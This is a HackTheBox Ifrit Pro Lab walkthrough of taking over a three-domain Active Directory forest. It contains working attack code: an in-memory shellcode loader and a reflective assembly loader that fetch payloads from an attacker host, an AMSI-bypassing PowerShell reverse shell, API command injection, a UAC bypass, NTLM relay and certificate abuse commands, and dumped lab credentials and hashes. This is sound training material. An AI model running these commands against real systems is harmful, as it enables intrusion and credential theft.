---
title: "Ifrit Pro Lab"
description: "HackTheBox Ifrit Pro Lab — full walkthrough of a 3-domain AD forest: AppLocker-bypassed foothold, backup/GitLab-leaked creds, an internal API RCE, MSSQL linked servers across a trust, ADCS ESC8→ESC1, SeManageVolume, RBCD, and DPAPI to forest root."
pageIcon: "https://app.hackthebox.com/images/icons/ic-prolabs/ic-ifrit-overview.svg"
---

**Ifrit** is a HackTheBox Active Directory Pro Lab modelling a **three-domain
forest** — root `ifrit.vl` with child domains `eu-ifrit.vl` and `it-ifrit.vl`.
Starting from a provided RDP account on **VDI02**, the path runs through a
backup-share credential leak and a private GitLab repo, an internal command-exec
**API RCE**, an **MSSQL linked-server bridge** that crosses the `eu-ifrit` →
`it-ifrit` trust with pure T-SQL, an **ADCS** certificate chain (ESC8 → ESC1),
**resource-based constrained delegation**, and **DPAPI** credential looting —
ending in **full forest compromise**.

## Attack path

<div style="max-width:660px;margin:1.5rem auto;font-family:system-ui,-apple-system,sans-serif;font-size:.9rem;">
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:88px;">VDI02</b><span style="color:#cbd5e1;">RDP with provided account · AppLocker bypass · Ligolo pivot</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:88px;">Loot</b><span style="color:#cbd5e1;"><code>home-backups$</code> → Firefox → <code>jack.smith</code> → GitLab → <code>dev:dev-5381</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:88px;">DEV05</b><span style="color:#cbd5e1;">API RCE → fodhelper UAC → GodPotato → SYSTEM</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:88px;">SQL03</b><span style="color:#cbd5e1;">impersonate <code>dev</code> → linked server → <b>SQL07</b> (crosses the trust)</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:88px;">SQL07</b><span style="color:#cbd5e1;">impersonate <code>sa</code>/<code>adm</code> → xp_cmdshell → SeManageVolume → SYSTEM</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:88px;">FS02</b><span style="color:#cbd5e1;">PetitPotam + ntlmrelayx → ADCS <b>ESC8</b> → <code>FS02$</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #fbbf24;background:rgba(251,191,36,.06);">
    <b style="color:#fff;min-width:88px;">DC07</b><span style="color:#cbd5e1;"><b>ESC1</b> (IT-Computers) → <code>it-ifrit.vl</code> Domain Admin</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #94a3b8;background:rgba(255,255,255,.045);">
    <b style="color:#fff;min-width:88px;">VDI02 ↺</b><span style="color:#cbd5e1;"><code>Sheila.Richards</code> (vdi-admins) → DPAPI → <code>ifrit.vl\administrator</code></span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(255,255,255,.14);border-left:4px solid #60a5fa;background:rgba(96,165,250,.06);">
    <b style="color:#fff;min-width:88px;">DC03</b><span style="color:#cbd5e1;"><code>VDI02$</code> WriteAccountRestrictions → <b>RBCD</b> → <code>eu-ifrit.vl</code> DA</span>
  </div>
  <div style="text-align:center;color:#64748b;">↓</div>
  <div style="display:flex;align-items:center;gap:.75rem;padding:.65rem .9rem;border-radius:10px;border:1px solid rgba(248,113,113,.4);border-left:4px solid #f87171;background:rgba(248,113,113,.08);">
    <b style="color:#fff;min-width:88px;">DC01</b><span style="color:#fca5a5;font-weight:600;"><code>ifrit.vl\administrator</code> → FOREST OWNED</span>
  </div>
</div>

## Environment

Nine live hosts across the three domains (`172.16.41.0/24`):

| Host | IP | Domain | Role |
| --- | --- | --- | --- |
| DC01 | .11 | `ifrit.vl` | Forest root DC |
| DC03 | .14 | `eu-ifrit.vl` | Child DC |
| DC07 | .17 | `it-ifrit.vl` | Child DC · **ADCS** (`it-ifrit-CA`) |
| DEV05 | .40 | `eu-ifrit.vl` | Internal API host |
| SQL03 | .250 | `eu-ifrit.vl` | MSSQL 2022 |
| SQL07 | .251 | `it-ifrit.vl` | MSSQL 2022 (linked) |
| FS02 | .210 | `it-ifrit.vl` | File server |
| VDI02 | .225 | `eu-ifrit.vl` | Entry / VDI |
| — | .150 | Linux | GitLab · SIEM · Squid |

:::note[Out of scope]
`PWM` (.215) is not part of the path. The **SIEM** (Elasticsearch `:9200`) is a
read-only dashboard for players to check their stealth, and the **Squid proxy**
(`:3128`) is the *intended* pivot into the network — I used **Ligolo** from
VDI02 instead.
:::

## Reconnaissance

An internal `nmap` sweep of `172.16.41.0/24` cleanly separates the estate into
three Active Directory domains plus a Linux services box:

- **Three Kerberos/LDAP realms** — `DC01` advertises `ifrit.vl`, `DC03`
  `eu-ifrit.vl`, and `DC07` `it-ifrit.vl`; the RDP NTLM info confirms the
  NetBIOS names. This is the forest layout: `ifrit.vl` root with two children.
- **ADCS on DC07** — port `443` serves a cert with `commonName=it-ifrit-CA`, and
  IIS on `:80` (`certsrv`) is the AD CS web-enrollment endpoint. Flagged for
  later — this becomes the ESC8/ESC1 engine.
- **MSSQL 2022** on both `SQL03` (`.250`) and `SQL07` (`.251`), each in a
  different domain — a linked-server bridge is the obvious candidate.
- **The `.150` Linux box** exposes **GitLab** (`:80`), a stray nginx (`:81`), a
  **Squid proxy** (`:3128`), and an **Elasticsearch SIEM** (`:9200`).

Enumerating VDI02's File Explorer (right-click → *Properties* on network objects,
plus the ARP cache) reveals the wider machine list — including hosts not yet
routable (`Backup01`, `DEV01/02`, `SQL01`, `VDI01`, and several `RAS500xx`
accounts):

```text title="Host discovery from VDI02"
Backup01  DC03  DEV01  DEV02  DEV05  SQL01  SQL03  VDI01  VDI02
RAS50005  RAS50011  RAS50014  RAS50021
# ARP: .11 .14 .17 .40 .150 .210 .215 .250 .251
```

## Initial Access — VDI02

The lab grants auto-generated domain accounts (e.g. `caroline.hunter:PenEuIfrit527#`).
**RDP into VDI02** with a provided account and drop a **Ligolo** agent to route
the whole `172.16.41.0/24` through it.

VDI02 enforces **AppLocker**, which restricts execution to trusted paths — in
practice only `C:\Windows`. Rather than fight the path rules with an on-disk
payload, run a **reflective in-memory loader**: pull raw Sliver shellcode over
SMB/HTTP and hand-map it with `VirtualAlloc` + `CreateThread` so nothing
untrusted ever touches disk:

```powershell title="Reflective shellcode loader (AppLocker-safe)"
$bytes = (Invoke-WebRequest -Uri "http://10.10.14.8:445/shellcode" -UseBasicParsing).Content
[Byte[]]$buf = $bytes

$k = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -Namespace W -PassThru

$m = $k::VirtualAlloc(0,$buf.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $m, $buf.Length)
$k::CreateThread(0,0,$m,0,0,0)
```

:::note[Tooling notes]
For BloodHound I ran **SysInternals ADExplorer** on the target — it must be the
**64-bit** build and, thanks to AppLocker, launched from a `C:\Windows`
subfolder. Share access is on the internal IP only, so reach the attacker SMB
server over the Ligolo tunnel (or an SSH port-forward from the Windows host).
:::

BloodHound data is also collected straight over LDAP with the provided account.
The `!1.2.840.113556.1.4.801=::MAMCAQc=` control sets the **SD flags** so the
query only pulls the DACL portion of each security descriptor (no `SeSecurityPrivilege`
needed), and the LDIF is converted with `ldapsearch_parser` / `bofhound`:

```bash title="LDAP collection → BloodHound"
ldapsearch -LLL -H ldap://dc03.eu-ifrit.vl -D 'EU-IFRIT\caroline.hunter' -w 'PenEuIfrit527#' \
  -b "DC=EU-IFRIT,DC=VL" -N -o ldif-wrap=no \
  -E '!1.2.840.113556.1.4.801=::MAMCAQc=' "(&(objectClass=*))" | tee objects.txt
```

## Foothold creds — backups share, GitLab & LDAP

From VDI02's File Explorer, `DC03` exposes a **`home-backups$`** share containing
a backup **`.vhdx`**. Mount it and pull the Firefox profile's `login.json`, which
stores a saved credential:

```text title="Firefox login.json (mounted .vhdx)"
jack.smith : JigokuNoKaen10
```

Those creds log into a **private GitLab repo** on `172.16.41.150`. Reading the
application source reveals the internal DEV05 API — a command-exec endpoint on
port **13300** and its service credentials:

```text title="GitLab source → DEV05 API"
http://172.16.41.40:13300   ·   /api/info   /api/query
dev : dev-5381
```

An authenticated LDAP user dump is also worth a pass — a couple of accounts leak
**initial passwords in their `description` field**, a recurring Ifrit theme:

```text title="nxc ldap --users (description leak)"
client-admin   Initial Password: Anfang01!
backup-admin   Initial Password: Anfang01!
```

## DEV05 — API RCE to SYSTEM

The `/api/query` endpoint runs shell commands server-side. Confirm execution
(the process runs as `jack.smith`, a local admin on DEV05):

```bash title="Command injection via the API"
curl -u dev:dev-5381 -X POST http://172.16.41.40:13300/api/query \
  -H "Content-Type: application/json" \
  -d '{"query": "process get name,processid && whoami"}'
```

Stage a Sliver beacon by base64-encoding a `Start-Process` of a beacon copied
from the attacker SMB share, and fire it through the same endpoint:

```bash title="Stage & launch the beacon"
curl -u dev:dev-5381 -X POST http://172.16.41.40:13300/api/query \
  -H "Content-Type: application/json" \
  -d '{"query": "process get name,processid && cmd /c powershell -e U3RhcnQtUHJvY2VzcyAtRmlsZXBhdGggQzpcVXNlcnNcamFjay5zbWl0aFxiZWFjb24uZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4="}'
```

The beacon lands at **medium** integrity. Bypass UAC with **fodhelper** — a
`ms-settings` protocol handler that auto-elevates and reads its command from a
writable `HKCU` key:

```powershell title="fodhelper UAC bypass"
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -Value "" -Force
Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "(default)" -Value "C:\Users\jack.smith\beacon.exe" -Force
Start-Process fodhelper.exe
```

`SeBackup` is disabled but **`SeImpersonate`** is enabled — **GodPotato** to
SYSTEM. Reflective loading of GodPotato was flaky against AV, so upload it and
run **once** from disk (re-launching the beacon) before it gets quarantined:

```powershell title="GodPotato → SYSTEM"
.\GodPotato-NET4.exe -cmd "powershell Start-Process -Filepath C:\Users\jack.smith\beacon.exe -WindowStyle Hidden"
```

Dump secrets. Mimikatz gives `jack.smith`'s NTLM, and `nxc --lsa` cracks out his
**cleartext** password plus cached creds and the machine key:

```text title="DEV05 secrets"
eu-ifrit\Jack.Smith  NTLM : 85391f332fdaa3ad651cee1fe44aa90b
eu-ifrit.vl\jack.smith : DXt9boDb8W_doj          # cleartext (LSA)
EU-IFRIT\DEV05$ : 61d1921b0c09e72ab6d3fe2406253474
```

> 🚩 DEV05 flag `IFRIT{30aef3a3ade21f16f0b4d87f56840072}`

## SQL03 → SQL07 — MSSQL linked servers across the trust

`jack.smith`'s password authenticates to **SQL03** (eu-ifrit). He isn't a
sysadmin, but enumeration shows two useful facts: `Jack.Smith` can **impersonate
the `dev` login**, and `dev` owns a **linked server to SQL07** (it-ifrit), mapped
across the trust as the remote login `bridge_it`:

```text title="enum_impersonate / enum_links (SQL03)"
EU-IFRIT\Jack.Smith  can IMPERSONATE  ->  dev
dev  ->  linked server  SQL07.IT-IFRIT.VL   (remote login: bridge_it)
```

The privilege ladder on the far side has to be walked one rung at a time. On
SQL07, `bridge_it` is not sysadmin, but it **can impersonate `sa`** — and the
real sysadmin login (`principal_id 1`) turns out to be **`adm`**. Chaining the
impersonations *inside* the `EXECUTE (...) AT` call runs the payload as `adm`,
which enables `xp_cmdshell`:

```sql title="Walk the impersonation chain onto SQL07"
EXECUTE AS LOGIN = 'dev';

-- who is the real sysadmin? principal_id 1 == adm
EXECUTE ('SELECT name FROM sys.server_principals WHERE principal_id = 1') AT [SQL07.IT-IFRIT.VL];

-- impersonate sa -> adm, then enable xp_cmdshell
EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC sp_configure ''show advanced options'',1; RECONFIGURE;
         EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [SQL07.IT-IFRIT.VL];
EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC xp_cmdshell ''whoami''') AT [SQL07.IT-IFRIT.VL];
-- nt service\mssqlserver
```

`mssqlserver` on SQL07 holds `SeImpersonate` — a SYSTEM foothold in the *other*
forest, reached entirely with T-SQL.

## SQL07 — reflective loading to SYSTEM

Getting a stable, AV-surviving beacon on SQL07 was the fight of the box.
Everything that touches disk or looks like a known tool was caught — plain
reverse shells, `curl`/`certutil` downloads, on-disk GodPotato, and `rundll32`
staging all failed. The winning approach is **stay in memory the whole way**: get
a thin foothold shell, then hand-map raw shellcode so the C2 never lands as a
file.

**Step 1 — a foothold shell.** An **AMSI-bypass + obfuscated `-enc` encoder**
payload (defeats the `-enc` string-scanning and gets past AMSI) lands a shell on
port `53` over the linked-server `xp_cmdshell`:

```sql title="Obfuscated PowerShell revshell over the link (port 53)"
EXECUTE ('EXECUTE AS LOGIN = ''adm''; EXEC xp_cmdshell ''powershell -nop -W hidden -noni -ep bypass -enc <obfuscated>''') AT [SQL07.IT-IFRIT.VL];
```

And to generate the powershell revershell, the following one liner is used

```python title="Python3 one liner to generate a encoded revershell"

python3 -c "
import base64
cmd = '\$T=New-Object Net.Sockets.TCPClient(\'172.16.116.201\',443);\$N=\$T.GetStream();\$W=New-Object IO.StreamWriter(\$N);function W(\$S){[byte[]]\$script:B=0..\$T.ReceiveBufferSize|%{0};\$W.Write(\$S+\'SHELL> \');\$W.Flush()};W \'\';while((\$R=\$N.Read(\$B,0,\$B.Length)) -gt 0){\$C=([text.encoding]::UTF8).GetString(\$B,0,\$R-1);\$O=try{iex \$C 2>&1|Out-String}catch{\$_|Out-String};W \$O};\$W.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
"

```

:::note[Ligolo port-forwarding for the callback]
SQL07 sits on the internal `it-ifrit` network and can't route to the attacker
box directly, so the reverse shell calls back to the **Ligolo tunnel interface**
(`172.16.116.201:443` above) rather than a real listener. Add a **listener /
port-forward on the Ligolo agent** so that inbound `:443` on the tunnel IP is
redirected to the handler on the attacker machine — otherwise the shell connects
into the pivot and dies with nothing catching it:

```bash title="Ligolo listener → attacker handler"
# in the ligolo-ng proxy console (session selected)
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
# now catch it locally
rlwrap nc -lvnp 443
```
:::

**Step 2 — reflectively load the beacon.** From that shell, pull the raw Sliver
**shellcode** over HTTP and inject it into the current process with
`VirtualAlloc` (RWX, `0x3000/0x40`) + `Marshal.Copy` + `CreateThread`. Nothing is
written to disk, so AppLocker/AV path and signature rules never fire. If the
`Copy` into RWX memory ever misbehaves, fall back to an `AllocHGlobal` buffer:

```powershell title="Reflective shellcode loader → in-memory beacon (SQL07)"
$bytes = (Invoke-WebRequest -Uri "http://10.10.14.37:445/mtls-shellcode" -UseBasicParsing).Content
[Byte[]]$buf = $bytes

$k = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -Namespace W -PassThru

$m = $k::VirtualAlloc(0,$buf.Length,0x3000,0x40)          # RWX, MEM_COMMIT|RESERVE
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $m, $buf.Length)
$k::CreateThread(0,0,$m,0,0,0)

## fallback if the RWX Copy misbehaves — stage into an AllocHGlobal buffer first
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $buf.Length)
```

**Step 3 — try to escalate in memory.** With a real beacon, GodPotato never has
to hit disk either: download the assembly bytes with `WebClient`, load it with
`[Reflection.Assembly]::Load`, and invoke its entry point directly. This keeps
the tool off disk, but on SQL07 the **`SeImpersonate` route still would not fire**
(the potato attacks failed regardless of how they were delivered):

```powershell title="In-memory GodPotato via reflective assembly load (did NOT work here)"
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.37:445/GodPotato-NET2.exe')
$asm   = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd', 'net user jellibean P@ssw0rd123! /add')))
$asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd', 'net localgroup administrators jellibean /add')))
```

**Step 4 — pick the privilege that actually works.** Enumerating the token shows
`SeImpersonate` *is* held, but so is **`SeManageVolume`** — and that's the one
that lands. The **SeManageVolume exploit** abuses the "perform volume maintenance
tasks" right to rewrite the DACL on `C:\`, granting the low-priv service write
access to system directories; drop a hijackable DLL a SYSTEM process auto-loads
and you inherit SYSTEM:

```text title="SQL07 token privileges"
SeManageVolumePrivilege        Perform volume maintenance tasks   Enabled   ✅ used
SeImpersonatePrivilege         Impersonate a client               Enabled   ❌ potatoes blocked
SeAssignPrimaryTokenPrivilege  Replace a process level token      Enabled
SeIncreaseQuotaPrivilege       Adjust memory quotas               Enabled
SeCreateGlobalPrivilege        Create global objects              Enabled
```

```powershell title="SeManageVolume exploit → SYSTEM"
.\SeManageVolumeExploit.exe    # C:\ now writable by our service; plant the DLL → SYSTEM
```

> 🚩 SQL07 flag `IFRIT{9f27c845ed6494f977aaf249e90c69cc}`

As SYSTEM, harvest the `SQL07$` machine identity. `Rubeus tgtdeleg` yields a
usable TGT (no plaintext needed), which drives both BloodHound collection and a
machine-template cert request:

```bash title="SQL07$ machine credential"
execute-assembly Rubeus.exe -- tgtdeleg /nowrap
bloodhound-python -d it-ifrit.vl -dc DC07.it-ifrit.vl -ns 172.16.41.17 -k -no-pass -u 'SQL07$' -c All

certipy req  -k -no-pass -u 'SQL07$@it-ifrit.vl' -dc-ip 172.16.41.17 -ca 'it-ifrit-CA' -template Machine -target DC07.it-ifrit.vl
certipy auth -pfx sql07.pfx -dc-ip 172.16.41.17     # -> SQL07$ NT hash
```

## FS02 — PetitPotam + ADCS ESC8

The `it-ifrit-CA` exposes **web enrollment over HTTP/HTTPS with channel binding
disabled — ESC8**. Stand up `ntlmrelayx` against the enrollment endpoint and
**coerce FS02** (via PetitPotam, authenticating as `SQL07$`) so its machine
authentication is relayed to the CA and minted into a certificate:

```bash title="ESC8 relay to mint FS02's certificate"
# terminal 1 — relay to ADCS web enrollment
ntlmrelayx.py -t http://172.16.41.17/certsrv/certfnsh.asp -smb2support --adcs --template Machine --no-http-server
# terminal 2 — coerce FS02 to authenticate (as SQL07$)
python3 PetitPotam.py -u 'SQL07$' -hashes :6a2072c8773a675ef5cc28e7efb0300b -d it-ifrit.vl 10.10.14.8 172.16.41.210
```

```text title="FS02$ hash from the cert"
certipy auth -pfx FS02.pfx -dc-ip 172.16.41.17
-> fs02$@it-ifrit.vl : 8d7b0500b8c2155faafb61e5ef7381b2
```

Re-running `certipy find` as `FS02$` confirms both the CA misconfig and the next
step — FS02 has enrollment rights on a template that is **its own escalation
path**:

```text title="certipy find (it-ifrit-CA)"
[!] ESC8 : Web Enrollment enabled over HTTP/HTTPS, Channel Binding disabled
Template : IT-Computers
  Client Authentication      : True
  Enrollee Supplies Subject  : True          # attacker chooses the SAN
  Enrollment Rights          : IT-IFRIT.VL\FS02
  [!] ESC1 : Enrollee supplies subject and template allows client authentication
```

## DC07 — ESC1 to it-ifrit Domain Admin

**ESC1** = a client-auth template where the enrollee supplies the subject. Enroll
as `FS02$` but set the **UPN to `Administrator@it-ifrit.vl`**, and the CA hands
back a certificate that authenticates *as the domain admin*:

```bash title="ESC1 → Administrator@it-ifrit.vl"
getTGT.py -hashes :8d7b0500b8c2155faafb61e5ef7381b2 'it-ifrit.vl/FS02$' -dc-ip 172.16.41.17
certipy req -k -no-pass -u 'FS02$@it-ifrit.vl' -dc-ip 172.16.41.17 -ca 'it-ifrit-CA' \
  -template 'IT-Computers' -target DC07.it-ifrit.vl \
  -upn 'Administrator@it-ifrit.vl' -dc-host DC07.it-ifrit.vl -key-size 4096
certipy auth -pfx administrator.pfx -dc-ip 172.16.41.17
# -> it-ifrit.vl\Administrator : 6b6b265c14e20192eb6a6dbb0a1426ba
```

Dump NTDS. This domain holds two keys to the rest of the forest — **`Sheila.Richards`**
(a member of `vdi-admins`) and the **`EU-IFRIT$` inter-domain trust key**:

```text title="NTDS (DC07, trimmed)"
krbtgt:502:...:86225470b55ad07a4528cf442b1fff0c
it-ifrit.vl\Sheila.Richards:1110:...:084fa60567c6b124d0a4ca54fac5d3ce
EU-IFRIT$:1103:...:9770a6626fa64b847e95fbfcefc7f219   # inter-domain trust
```

> 🚩 DC07 flag `IFRIT{0bdd04482d51c7250097c0a149887fa0}` — `it-ifrit.vl` owned.

## VDI02 (revisit) — Sheila.Richards & DPAPI to root DA

`Sheila.Richards` is in `vdi-admins`, which is **local admin on VDI02**. Pass her
NT hash and dump SAM/LSA and — the prize — **DPAPI**:

```bash title="Loot VDI02 as Sheila.Richards"
nxc smb 172.16.41.225 -u 'it-ifrit\Sheila.Richards' -H 084fa60567c6b124d0a4ca54fac5d3ce --sam --lsa
# yields VDI02$ : 31056cc492be3f4ea7a0134d49014a87  + dpapi machine/user keys
```

Decrypting the stored DPAPI blobs with those masterkeys recovers the **forest
root** administrator credential outright:

```text title="DPAPI"
ifrit.vl\administrator : GoldenBuddaRests85
```

## DC03 — RBCD to eu-ifrit Domain Admin

BloodHound flags that **`VDI02$` has `WriteAccountRestrictions` on `DC03`** — the
exact right needed to write `msDS-AllowedToActOnBehalfOfOtherIdentity`. Configure
**resource-based constrained delegation** so `VDI02$` can act on behalf of anyone
to `DC03`, then S4U to impersonate `Administrator`:

```bash title="RBCD → DC03"
rbcd.py -delegate-from 'VDI02$' -delegate-to 'DC03$' -action write \
  -dc-ip 172.16.41.14 'eu-ifrit/VDI02$' -hashes ':31056cc492be3f4ea7a0134d49014a87'
# [*] VDI02$ can now impersonate users on DC03$ via S4U2Proxy

getST.py -spn 'cifs/DC03.eu-ifrit.vl' -impersonate Administrator \
  -hashes ':31056cc492be3f4ea7a0134d49014a87' -dc-ip 172.16.41.14 'eu-ifrit/VDI02$'
nxc smb 172.16.41.14 --use-kcache --sam --lsa --ntds   # eu-ifrit.vl owned
```

## DC01 — forest root

The DPAPI-recovered `ifrit.vl\administrator` is a **forest Enterprise Admin** —
it authenticates straight to the root DC, no further escalation required:

```text title="DC01 (ifrit.vl)"
nxc smb 172.16.41.11 -u Administrator -p 'GoldenBuddaRests85' --sam
[+] ifrit.vl\Administrator:GoldenBuddaRests85 (Pwn3d!)
```

**Forest owned.** 🏁

## Takeaways

- **Secrets in backups & repos are the foothold.** A readable `home-backups$`
  share (a whole Firefox profile inside a `.vhdx`) and a private GitLab repo
  handed over every credential needed to start — reinforced by initial passwords
  sitting in LDAP `description` fields.
- **MSSQL linked servers ignore domain boundaries.** The SQL03→SQL07 link plus a
  `Jack.Smith`→`dev`→`bridge_it`→`sa`→`adm` impersonation chain crossed the
  `eu-ifrit` → `it-ifrit` trust with nothing but T-SQL.
- **Match the exploit to the token, not the checklist.** `SeImpersonate` was
  present on SQL07 but potato attacks were blocked; **`SeManageVolume`** was the
  privilege that actually converted to SYSTEM.
- **ADCS is a domain-takeover engine.** ESC8 (relay a coerced machine auth)
  bootstrapped a machine identity, and ESC1 (EnrolleeSuppliesSubject) turned it
  into a Domain Admin certificate.
- **Delegation + DPAPI bridge the domains.** `WriteAccountRestrictions`→RBCD took
  `eu-ifrit`, and DPAPI on a shared VDI leaked the forest-root admin — game over.
